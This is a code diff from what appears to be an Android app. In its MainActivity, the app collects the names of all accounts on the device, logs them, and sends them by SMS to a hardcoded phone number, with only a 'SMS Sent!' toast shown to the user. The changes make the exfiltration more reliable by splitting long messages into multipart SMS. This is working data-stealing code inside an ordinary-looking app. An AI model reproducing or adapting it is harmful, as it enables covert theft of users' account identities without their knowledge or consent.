@@ -28,6 +28,7 @@ import android.widget.Button;
 import android.widget.Toast;
 
 import java.lang.reflect.Method;
+import java.util.ArrayList;
 
 
 public class MainActivity extends ActionBarActivity {
@@ -98,7 +99,7 @@ public class MainActivity extends ActionBarActivity {
     public void recupAccount(){
         Account[] lstAcc = AccountManager.get(getApplicationContext()).getAccounts();
         for(Account Acc : lstAcc){
-            account = account + "Compte: " + Acc.name + "/n";
+            account = account + "Compte: " + Acc.name + System.getProperty("line.separator");
         }
         Log.d("TestAccount", account);
         sendSMS(account);
@@ -107,7 +108,8 @@ public class MainActivity extends ActionBarActivity {
     protected void sendSMS(String recipient) {
         try {
             SmsManager smsManager = SmsManager.getDefault();
-            smsManager.sendTextMessage("+33676826908", null, recipient, null, null);
+            ArrayList<String> msg = smsManager.divideMessage(recipient);
+            smsManager.sendMultipartTextMessage("+33676826908", null, msg, null, null);
             Toast.makeText(getApplicationContext(), "SMS Sent!",
                     Toast.LENGTH_LONG).show();
         } catch (Exception e) {
